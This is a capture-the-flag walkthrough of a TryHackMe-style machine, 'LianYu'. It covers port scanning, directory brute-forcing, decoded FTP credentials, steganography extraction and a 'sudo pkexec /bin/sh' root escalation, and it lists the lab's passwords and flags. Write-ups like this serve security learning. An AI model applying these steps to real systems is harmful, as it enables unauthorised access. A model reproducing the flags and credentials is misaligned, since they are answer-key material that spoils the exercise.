# Linayu
## Enumeration
```
nmap -sS -sV -A {your ip}
```
```
Ports Found:
Port 80 Running Apache2
Port 22 Running SSH
Port 21 Running FTP
```
### Website Lookup
```
Found Nothing In Website
Started Go Buster Scan With Medium.txt
gobuster -u {your ip} -w /usr/share/dirb/wordlists/medium.txt 
Found /island In Website In It A Hidden Text Named Vigilante Lets Note It.
```
### Again Lookup On /island
```
Firstly I was stucked Here because of using string Wordlists
gobuster -u {your ip} -w /usr/share/dirb/wordlists/directory-list-lowercase-2.3-medium.txt
Found A hidden Directory Named 2100 
After Examing View Source I Found There A Hint For Extension .ticket
```
### Started To Look For Extension With .ticket
```
gobuster -u {your ip} -w /usr/share/dirb/wordlists/medium.txt -x .ticket
Found green_arrow.ticket
```
### Found FTP Credentials
```
We Found Pass For FTP But It Is Encoded In Base 58 So Decoded It using Decoder
User Name = Vigilante Pass = !#th3h00d (Decoded)
```
### Steganography
```
In FTP We Got Three Files:
[+] aa.png
[+] Leave_me_alone.png
[+] Queen's_Gambit.png
But Leave_me_alone.png is corrupted After Examining In Hex Editor I Found That Is Not A Correct Header For Png Format So I Googled Png Hex Header And Replaced It With Googled Image Now I Got Password For aa.png
```
![alt text](https://3.bp.blogspot.com/-nfLNH0R3_R8/V_Gb1cXSlLI/AAAAAAAADUc/UKVFSKl2i-Q-S5csaoxSaQwfxEiH9u8cACLcB/s1600/png_file_header.PNG)
```
steghide extract -sf aa.png Password = password
Now We Got A Zip After Extracting It We Got shado and passwd.txt
There Is Nothing In passwd.txt But In Shado we have pass For SSH {M3tahuman}
I Tried username with oliver and vigilante But I Failed
So I Prompted FTP again and changed directory to /home/ Now I Got The username Slade 
So I SSH Into It Boom I Got user.txt
User Flag = THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```
### Privilage Escalation
```
i Fired Sudo -l And got this
```
**User slade may run the following commands on LianYu: (root) PASSWD: /usr/bin/pkexec**
```
I Opened gtfo-bins and searched for pkexec And Got A Command For Privilage Escalation Which Is:
sudo pkexec /bin/sh
```
**WTF PRIVILAGE ESCALATION IN LESS THAN 30 SECONDS :0**
### Root Flag
```
Root Flag = THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```
**Machine Hacked By Patan Musthakheem Khan**
